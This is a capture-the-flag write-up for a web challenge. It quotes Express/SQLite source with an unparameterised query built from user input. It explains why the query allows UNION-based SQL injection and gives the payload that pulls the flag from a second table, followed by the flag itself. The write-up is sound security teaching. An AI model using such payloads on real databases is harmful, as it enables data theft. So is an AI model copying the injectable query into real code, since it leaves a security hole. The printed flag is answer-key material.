# walter's crystal shop

## Solution

Info from the source code: 
* There are two tables exists which are, ```crystals``` and ```flag```.
* Crystals have 3 columns and Flag has one column.

From this info, we can assume that the question wants us to do some "Union SQLi" to get the flag from ```flag``` table. 
```javascript
db.serialize(() => {
  db.run("CREATE TABLE crystals (name TEXT, price REAL, quantity INTEGER)");

  const stmt = db.prepare("INSERT INTO crystals (name, price, quantity) VALUES (?, ?, ?)");

  for (const crystal of crystals) {
    stmt.run(crystal["name"], crystal["price"], crystal["quantity"]);
  }
  stmt.finalize();

  db.run("CREATE TABLE IF NOT EXISTS flag (flag TEXT)");
  db.run(`INSERT INTO flag (flag) VALUES ('${flag}')`);
});
```

This lines of codes proves that there is vulnerability to do some UNION SQL ATTACK. There is no validation on the name variable query.
```javascript
app.get("/crystals", (req, res) => {
  const { name } = req.query;

  if (!name) {
    return res.status(400).send({ err: "Missing required fields" });
  }

  db.all(`SELECT * FROM crystals WHERE name LIKE '%${name}%'`, (err, rows) => {
    if (err) {
      console.error(err.message);
      return res.status(500).send('Internal server error');
    }

    return res.send(rows);
  });
});

```

Now we can crete the payload for UNION SQL ATTACK. Since the crystals table needs 3 columns so we need to add NULL columns so the SELECT statement is valid.
```
' UNION SELECT flag,null,null from flag--
```

## Flag
The flag for this challenge is ```nbctf{h0p3fuLLy_7h3_D3A_d035n7_kn0w_ab0ut_th3_0th3r_cRyst4l5}```
